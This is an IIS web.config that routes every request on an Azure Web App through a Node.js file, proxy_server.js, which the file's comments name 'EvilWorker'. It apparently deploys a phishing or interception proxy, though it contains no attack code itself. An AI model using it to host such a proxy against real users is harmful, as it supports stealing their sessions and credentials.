<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="iisnode" path="proxy_server.js" verb="*" modules="iisnode" />
    </handlers>
    
    <rewrite>
      <rules>
        <!-- Force all requests to go through EvilWorker -->
        <rule name="EvilWorker Proxy" stopProcessing="true">
          <match url=".*" />
          <conditions>
            <add input="{REQUEST_FILENAME}" matchType="IsFile" negate="true" />
            <add input="{REQUEST_FILENAME}" matchType="IsDirectory" negate="true" />
          </conditions>
          <action type="Rewrite" url="proxy_server.js" />
        </rule>
      </rules>
    </rewrite>
    
    <!-- Disable default Azure Web App behavior -->
    <defaultDocument>
      <files>
        <clear />
        <add value="proxy_server.js" />
      </files>
    </defaultDocument>
    
    <!-- Force Node.js to handle all requests -->
    <iisnode
      nodeProcessCommandLine="node"
      watchedFiles="*.js;*.json"
      loggingEnabled="true"
      logDirectory="iisnode"
      maxLogFileSizeInKB="128"
      maxTotalLogFileSizeInKB="1024"
      maxLogFiles="20"
      devErrorsEnabled="true"
      flushInterval="2"
      enableXFF="false"
      promoteServerVars=""
      configOverrides="iisnode.yml"
      debuggingEnabled="false"
      debugHeaderEnabled="false"
      debuggerPortRange="5058-6058"
      debuggerPortStart="5058"
      maxConcurrentRequestsPerProcess="1024"
      maxNamedPipeConnectionRetry="100"
      namedPipeConnectionRetryDelay="250"
      maxNamedPipeConnectionPoolSize="512"
      maxNamedPipePooledConnectionAge="30000"
      initialRequestBufferSize="4096"
      maxRequestBufferSize="65536"
      uncFileChangesPollingInterval="5000"
      gracefulShutdownTimeout="60000"
      node_env="production"
      />
  </system.webServer>
</configuration>
